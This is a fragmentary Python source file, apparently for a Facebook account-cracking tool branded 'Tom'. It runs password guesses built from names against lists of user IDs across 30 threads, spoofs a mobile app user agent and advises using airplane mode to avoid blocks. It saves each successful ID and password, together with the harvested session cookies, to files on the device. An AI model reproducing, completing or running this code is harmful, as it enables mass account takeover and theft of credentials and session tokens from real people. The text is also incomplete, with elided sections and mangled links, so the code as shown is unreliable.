...
from concurrent.futures import ThreadPoolExecutor as mogidRP
from string import * 
...
def randBuildLSB():
    ...
    END = 'Dalvik/2.1.0 (Linux; Android 12; V2036 Build/SP1A.210812.003; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/103.0.5060.129 Mobile Safari/537.36[FB_IAB/FB4A;FBAV/428.0.0.26. 108;]'
...
logo ="""\033[1;32m
d888888b  .d88b.  .88b  d88.
`~~88~~' .8P  Y8. 88'YbdP`88 
   88    88    88 88  88  88 
   88    88    88 88  88  88 
   88    `8b  d8' 88  88  88 
   YP     `Y88P'  YP  YP  YP\033[1;33m~~~~\033[1;32mP \033[1;33mA \033[1;34mR \033[1;35mV \033[1;36mE \033[1;37mZ
\033[1;32m--------------------------------------------------------
...
def Tom():   
    ...
    if select =='1':
        ...
        os.system('xdg-open https://chat.whatsapp.com8NYNQBHhEYnVxN4X7')
        pass
    elif select =='F':
        os.system('xdg-open https://facebook.com/grou7062245271082/')
    else:
        print('\n Select valid option ... ')
        time.sleep(2)
        RP(allkey)
...
class main_crack():
    ...
    def methodA(self, sid, name, psw):
        try:
            global oks,cps,loop
            sys.stdout.write(f"\r {S}[Tom] {loop} | M1 OK/CP {len(oks)}/{len(cps)} | {S}{'{:.0%}'.format(loop/float(len(self.id)))}{S}")
            sys.stdout.flush()
            fs = name.split(' ')[0]
            try:
                ls = name.split(' ')[1]
...
'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',}
                ...
                if 'session_key' in q:
                    ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);RPb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"sb={RPb};{ckkk}"
                    print(f"\r{R} [Tom-OK] {sid} | {ps} {S}")
                    oks.append(sid)
                    open('/sdcard/Tom_OK_ids_M1.txt','a').write(sid+'|'+ps+'\n');open('/sdcard/RP_iDs_COOKiEs_M1.txt','a').write(sid+'|'+ps+'|'+cookie+'\n')
                    break
                elif 'www.facebook.com' in q['error']['message']:
                     print(f"\r{A} [Tom-CP] {sid} | {ps} {S}")
                     cps.append(sid)
                     open('/sdcard/Tom_CP.txt','a').write(sid+'|'+ps+'\n')
                else:
                    continue
            loop+=1
    ...
    def methodC(self, sid, name, psw):
        try:
            global oks,cps,loop
            sys.stdout.write(f"\r {S}[Tom] {loop} | M3 OK/CP {len(oks)}/{len(cps)} | {S}{'{:.0%}'.format(loop/float(len(self.id)))}{S}")
            sys.stdout.flush()
            fs = name.split(' ')[0]
            try:
                ls = name.split(' ')[1]
...
'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',}
                ...
                if 'session_key' in q:
                    ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);RPb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"sb={RPb};{ckkk}"
                    print(f"\r{R} [RP-OK] {sid} | {ps} {S}")
                    oks.append(sid)
                    open('/sdcard/RP_OK_ids_M2.txt','a').write(sid+'|'+ps+'\n');open('/sdcard/RP_iDs_COOKiEs_M2.txt','a').write(sid+'|'+ps+'|'+cookie+'\n')
                    break
                elif 'www.facebook.com' in q['error']['message']:
                    print(f"\r{A} [RP-CP] {sid} | {ps} {S}")
                    cps.append(sid)
                    open('/sdcard/RP_CP.txt','a').write(sid+'|'+ps+'\n')
                else:
                    continue
            loop+=1
        except requests.exceptions.ConnectionError:
    ...
    def methodD(self, sid, name, psw):
        global oks,cps,loop
        sys.stdout.write(f"\r {S}[Tom] {loop} | M4 OK/CP {len(oks)}/{len(cps)} | {S}{'{:.0%}'.format(loop/float(len(self.id)))}{S}")
        sys.stdout.flush()
        fs = name.split(' ')[0]
        try:
            ls = name.split(' ')[1]
        ...
        try:
            for pw in psw:
                ...
                if 'c_user' in session.cookies.get_dict():
                    print(f"\r{R} [RP-OK] {sid} | {ps} {S}")
                    oks.append(sid)
                    open('/sdcard/RP_OK.txt','a').write(sid+'|'+ps+'\n')
                    break
    ...
    def pasw(self):       
            ...
            print(f"\{A}Use flight (airplane) mode before use {S}")
            print("\033[1;32mᚘᚘᚘᚘᚘᚘᚘᚘᚘᚘᚘᚘᚘᚘᚘᚘᚘᚘᚘᚘᚘᚘᚘᚘᚘᚘᚘᚘᚘᚘᚘᚘᚘ")
            print(f'{S} Total IDs >> %s ' % len(self.id))
            print('\033[1;32mCracking Started >>')
            print("ᚘᚘᚘᚘᚘᚘᚘᚘᚘᚘᚘᚘᚘᚘᚘᚘᚘᚘᚘᚘᚘᚘᚘᚘᚘᚘᚘᚘᚘᚘᚘᚘᚘᚘᚘᚘᚘ")
            with mogidRP(max_workers=30) as RPworld:
                for zsb in self.id:
                   try:
                       uid, name = zsb.split('|')
                       sz = name.split(' ')
                       if len(sz) == 3 or len(sz) == 4 or len(sz) == 5 or len(sz) == 8:
                           pwx =  pw
                            ...
                            if 'methodA' in methods:
                                RPworld.submit(self.methodA, uid, name, pwx)
                            elif 'methodB' in methods:
                                RPworld.submit(self.methodB, uid, name, pwx)
                            elif 'methodC' in methods:
                                RPworld.submit(self.methodC, uid, name, pwx)
                            elif 'methodD' in methods:
                                RPworld.submit(self.methodD, uid, name, pwx)
                   except:pass
            result(oks,cps)   
